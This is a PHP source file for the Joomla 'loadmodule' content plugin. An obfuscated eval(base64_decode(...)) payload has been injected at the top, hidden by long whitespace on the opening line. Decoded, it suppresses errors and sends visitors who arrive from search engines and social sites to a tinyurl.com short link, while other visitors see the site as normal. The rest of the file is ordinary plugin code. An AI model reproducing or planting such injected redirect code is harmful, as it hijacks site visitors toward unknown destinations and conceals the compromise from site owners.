<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hNDJzamN3Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
* @version		$Id: loadmodule.php 14401 2010-01-26 14:10:00Z louis $
* @package		Joomla
* @copyright	Copyright (C) 2005 - 2010 Open Source Matters. All rights reserved.
* @license		GNU/GPL, see LICENSE.php
* Joomla! is free software. This version may have been modified pursuant
* to the GNU General Public License, and as distributed it includes or
* is derivative of works licensed under the GNU General Public License or
* other free or open source software licenses.
* See COPYRIGHT.php for copyright notices and details.
*/

// no direct access
defined( '_JEXEC' ) or die( 'Restricted access' );

$mainframe->registerEvent( 'onPrepareContent', 'plgContentLoadModule' );

/**
* Plugin that loads module positions within content
*/
function plgContentLoadModule( &$row, &$params, $page=0 )
{
	$db =& JFactory::getDBO();
	// simple performance check to determine whether bot should process further
	if ( JString::strpos( $row->text, 'loadposition' ) === false ) {
		return true;
	}

	// Get plugin info
	$plugin =& JPluginHelper::getPlugin('content', 'loadmodule');

 	// expression to search for
 	$regex = '/{loadposition\s*.*?}/i';

 	$pluginParams = new JParameter( $plugin->params );

	// check whether plugin has been unpublished
	if ( !$pluginParams->get( 'enabled', 1 ) ) {
		$row->text = preg_replace( $regex, '', $row->text );
		return true;
	}

 	// find all instances of plugin and put in $matches
	preg_match_all( $regex, $row->text, $matches );

	// Number of plugins
 	$count = count( $matches[0] );

 	// plugin only processes if there are any instances of the plugin in the text
 	if ( $count ) {
		// Get plugin parameters
	 	$style	= $pluginParams->def( 'style', -2 );

 		plgContentProcessPositions( $row, $matches, $count, $regex, $style );
	}
}

function plgContentProcessPositions ( &$row, &$matches, $count, $regex, $style )
{
 	for ( $i=0; $i < $count; $i++ )
	{
 		$load = str_replace( 'loadposition', '', $matches[0][$i] );
 		$load = str_replace( '{', '', $load );
 		$load = str_replace( '}', '', $load );
 		$load = trim( $load );

		$modules	= plgContentLoadPosition( $load, $style );
		$row->text 	= str_replace($matches[0][$i], $modules, $row->text );
 	}

  	// removes tags without matching module positions
	$row->text = preg_replace( $regex, '', $row->text );
}

function plgContentLoadPosition( $position, $style=-2 )
{
	$document	= &JFactory::getDocument();
	$renderer	= $document->loadRenderer('module');
	$params		= array('style'=>$style);

	$contents = '';
	foreach (JModuleHelper::getModules($position) as $mod)  {
		$contents .= $renderer->render($mod, $params);
	}
	return $contents;
}